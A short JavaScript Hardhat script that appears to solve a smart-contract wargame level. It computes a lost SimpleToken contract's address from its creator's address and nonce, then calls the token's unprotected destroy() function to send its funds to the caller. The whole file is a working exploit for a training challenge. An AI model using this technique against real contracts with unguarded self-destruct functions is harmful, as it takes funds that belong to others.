const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xEA1141bd8514D0468Cd94a54182EF7d947FaB08C'
const abi = []

async function hack(contract, signer) {
    // Fortunately, contract addresses are deterministic based on the address of the creator.
    // Ethers has a simple helper function to do this for you.
    const simpleTokenAddress = ethers.utils.getContractAddress({ from: contract.address, nonce: 1})
    console.log(`SimpleToken Address: ${simpleTokenAddress}`)

    // Once you have the address, it's easy to remove funds with the destroy function.
    simpleTokenABI = ["function destroy(address payable _to) public"]
    simpleToken = new ethers.Contract(simpleTokenAddress, simpleTokenABI, signer)

    const tx = await simpleToken.destroy(signer.address)
    await tx.wait()
    console.log(`SimpleToken destroyed. Funds recovered. Day saved.`)
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})